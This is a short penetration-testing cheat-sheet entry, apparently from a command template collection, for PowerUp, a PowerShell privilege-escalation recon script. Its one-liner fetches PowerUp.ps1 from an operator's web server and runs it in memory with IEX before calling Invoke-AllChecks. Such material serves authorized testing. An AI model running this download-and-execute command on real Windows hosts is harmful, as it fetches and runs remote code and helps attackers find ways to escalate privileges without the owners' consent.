# PowerUp

#plateform/windows #target/local #cat/RECON #tag/powershell
## oneliner
```powershell
(new-object system.net.webclient).downloadstring('http://<local_ip>:<port|80>/<dl_powerup_path>PowerUp.ps1') | IEX; Invoke-AllChecks
```
= dl_powerup_path: windows/windows_weaponize/ps/empire/privesc/